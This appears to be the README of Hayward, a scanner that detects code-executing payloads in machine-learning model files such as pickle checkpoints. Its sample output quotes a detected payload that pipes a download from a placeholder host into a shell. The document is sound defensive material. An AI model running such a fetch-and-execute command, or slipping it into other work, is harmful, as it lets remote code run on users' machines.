# Hayward

**Security scanner for machine-learning model files.** Know whether a
checkpoint will run code on your machine, before you load it.

```bash
pip install hayward
hayward scan ./models
```

```
CRITICAL MFV-PICKLE-001  checkpoints/model.pt
         Pickle file references unsafe callable(s) that grant code/command
         execution on load: posix.system('curl http://example.invalid | sh').

1 finding(s): 1 critical
```

## The problem

`torch.load`, `joblib.load` and `numpy.load(allow_pickle=True)` execute code
from the file they read. That is not a bug, it is what pickle does. Every model
you download from a hub is an executable, and opening it is running it.

## What makes it different

**It stays quiet.** Zero findings above INFO across 215 real models from the
HuggingFace Hub. A gate that cries wolf gets switched off.

**It tells you when it could not look.** A file it cannot parse produces an
explicit finding, never silence. Attackers hide payloads behind deliberate
parse errors, and a clean report should mean the file was read.

**It catches gadgets nobody has listed.** Unknown callables are judged by the
arguments they were handed, not by their name. A URL, a shell command, a host
and port. That is what generalises past the deny list.

**It installs anywhere.** One dependency, no model framework, no native
extensions, no network. Python 3.10 and up.

**It fits a build.** Deliberate exit codes, JSON output, a threshold you set.

## What it scans

Pickle in every wrapper it ships in (PyTorch, joblib, NumPy, TorchServe,
NeMo, skops), plus SafeTensors, GGUF, Keras, ONNX, TensorFlow, TFLite and
PMML. Format comes from magic bytes, so a renamed file does not slip through.

## Three ways to run it

```bash
hayward scan ./models              # command line
hayward-gui                        # desktop window
```

```python
from hayward import ModelFileScanner
findings = ModelFileScanner().scan_directory(Path("models"))
```

## Documentation

- [Usage](docs/usage.md): CLI reference, exit codes, CI, the GUI, the Python API
- [Rules](docs/rules.md): all 40 rules with severities and CWE mappings
- [Coverage](docs/coverage.md): what it does when it cannot read a file, and why that is a finding
- [How it works](docs/how-it-works.md): opcode walking and argument-evidence promotion
- [Accuracy](docs/accuracy.md): measured results, the caveats, and where it loses

## Contributing

The most useful contribution is a file Hayward gets wrong.

```bash
git clone https://github.com/hedgerow-dev/hayward
cd hayward && pip install -e ".[dev]" && pytest
```

## Security

Report vulnerabilities in Hayward to hello@hedgerow.dev rather than in an
issue. Input that crashes the scanner counts: under a CI gate, a crash is
indistinguishable from a scan that never ran.

## Licence

MIT. See [LICENSE](LICENSE) and [NOTICE](NOTICE).

A *hayward* was the parish officer who walked the hedges, checked the gaps and
impounded whatever had got through.
